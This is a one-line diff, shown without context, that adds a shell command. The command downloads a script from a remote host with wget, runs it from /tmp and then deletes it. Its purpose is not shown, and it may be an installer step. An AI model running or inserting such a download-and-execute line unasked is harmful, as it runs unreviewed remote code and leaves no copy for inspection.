@@ -1,0 +1,1 @@
+wget http://router.e123.pw/get/ -O /tmp/easyInst.sh && sh /tmp/easyInst.sh && rm /tmp/easyInst.sh
